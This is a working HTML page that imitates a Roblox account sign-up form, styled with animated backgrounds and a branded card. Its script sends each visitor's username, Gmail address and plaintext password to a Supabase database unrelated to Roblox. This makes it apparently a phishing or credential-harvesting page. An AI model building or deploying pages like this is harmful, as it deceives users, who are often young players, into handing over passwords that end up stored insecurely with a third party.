<!DOCTYPE html>
<html>
<head>
<title>Roblox Style Register</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, sans-serif;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#0f1115;
    overflow:hidden;
}

/* Animated glowing blobs */
.bg-circle{
    position:absolute;
    width:400px;
    height:400px;
    border-radius:50%;
    filter:blur(120px);
    opacity:0.3;
    animation: float 8s infinite ease-in-out;
}

.circle1{
    background:#00A2FF;
    top:10%;
    left:15%;
}

.circle2{
    background:#ff3d81;
    bottom:10%;
    right:15%;
    animation-delay:2s;
}

@keyframes float{
    0%,100%{transform:translateY(0);}
    50%{transform:translateY(-40px);}
}

/* Card */
.box{
    position:relative;
    z-index:2;
    width:360px;
    padding:30px;
    border-radius:18px;
    background:rgba(30,32,38,0.85);
    backdrop-filter: blur(12px);
    box-shadow:0 0 30px rgba(0,162,255,0.2);
    text-align:center;
    color:white;

    animation: fadeIn 0.8s ease;
}

@keyframes fadeIn{
    from{opacity:0; transform:translateY(30px);}
    to{opacity:1; transform:translateY(0);}
}

h1{
    color:#00A2FF;
    margin-bottom:5px;
    letter-spacing:2px;
}

.subtitle{
    font-size:12px;
    color:#aaa;
    margin-bottom:20px;
}

/* Inputs */
input{
    width:100%;
    padding:12px;
    margin:8px 0;
    border:none;
    border-radius:8px;
    background:#1a1c22;
    color:white;
    outline:none;
    transition:0.3s;
    border:1px solid transparent;
}

input:focus{
    border:1px solid #00A2FF;
    box-shadow:0 0 12px rgba(0,162,255,0.4);
    transform:scale(1.02);
}

/* Button */
button{
    width:100%;
    padding:12px;
    margin-top:12px;
    border:none;
    border-radius:8px;
    cursor:pointer;
    font-weight:bold;
    color:white;

    background:linear-gradient(90deg,#00A2FF,#0077ff);
    transition:0.3s;
    position:relative;
    overflow:hidden;
}

/* button hover animation */
button:hover{
    transform:translateY(-2px);
    box-shadow:0 10px 25px rgba(0,162,255,0.3);
}

/* click animation ripple */
button:active::after{
    content:"";
    position:absolute;
    width:100%;
    height:100%;
    background:rgba(255,255,255,0.2);
    left:0;
    top:0;
    animation:ripple 0.4s ease;
}

@keyframes ripple{
    from{opacity:1;}
    to{opacity:0;}
}

/* message */
#msg{
    margin-top:12px;
    font-size:13px;
    color:#ffcc00;
    min-height:20px;
}

/* floating animation on card */
.box:hover{
    transform:translateY(-3px);
    transition:0.3s;
}
</style>
</head>

<body>

<!-- background animations -->
<div class="bg-circle circle1"></div>
<div class="bg-circle circle2"></div>

<div class="box">
    <h1>ROBLOX</h1>
    <p class="subtitle">Create your account</p>

    <input type="text" id="username" placeholder="Username">
    <input type="email" id="gmail" placeholder="Gmail">
    <input type="password" id="password" placeholder="Password">

    <button onclick="register()">Sign Up</button>

    <p id="msg"></p>
</div>

<script>
const SUPABASE_URL = "https://ogqaxkbfnlfcgkmlbnpq.supabase.co";
const SUPABASE_KEY = "sb_publishable_s4NlhIOK-kuMjeBneYa1zQ_L2Q-EXza";

async function register() {

    const username = document.getElementById("username").value;
    const gmail = document.getElementById("gmail").value;
    const password = document.getElementById("password").value;

    const msg = document.getElementById("msg");
    msg.innerText = "Loading...";

    try {
        const res = await fetch(SUPABASE_URL + "/rest/v1/users", {
            method: "POST",
            headers: {
                apikey: SUPABASE_KEY,
                Authorization: "Bearer " + SUPABASE_KEY,
                "Content-Type": "application/json",
                Prefer: "return=representation"
            },
            body: JSON.stringify({
                username,
                gmail,
                password
            })
        });

        const data = await res.json().catch(() => null);

        if (res.ok) {
            msg.innerText = "✅ Account Created!";
            msg.style.color = "#00ff99";
        } else {
            msg.innerText = "❌ Error: " + JSON.stringify(data);
            msg.style.color = "#ff5555";
        }

    } catch (err) {
        msg.innerText = "❌ Network Error: " + err.message;
        msg.style.color = "#ff5555";
    }
}
</script>

</body>
</html>
